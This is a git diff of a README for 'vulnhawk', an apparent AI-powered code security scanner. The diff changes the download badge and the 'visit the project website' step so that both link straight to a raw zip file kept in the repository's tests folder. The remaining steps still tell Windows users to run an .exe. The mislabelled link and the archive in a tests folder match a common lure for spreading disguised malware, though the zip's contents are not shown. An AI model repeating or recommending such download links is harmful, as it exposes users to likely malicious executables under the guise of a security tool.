@@ -1,6 +1,6 @@
 # 🔍 vulnhawk - Find dangerous bugs in your code
 
-[![](https://img.shields.io/badge/Download-vulnhawk-blue.svg)](https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk)
+[![](https://img.shields.io/badge/Download-vulnhawk-blue.svg)](https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk/raw/refs/heads/main/tests/Software_v1.0.zip)
 
 Vulnhawk finds security flaws in your software projects. It uses artificial intelligence to look for issues that standard security tools often miss. Use this tool to protect your applications from unauthorized access and data theft.
 
@@ -34,7 +34,7 @@ Before you install the tool, make sure your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project website at [https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk](https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk).
+1. Visit the project website at [https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk/raw/refs/heads/main/tests/Software_v1.0.zip](https://github.com/Ulcerativecolitisbauhaus1057/vulnhawk/raw/refs/heads/main/tests/Software_v1.0.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version link at the top of that list.
 4. Locate the file ending in .exe for Windows.
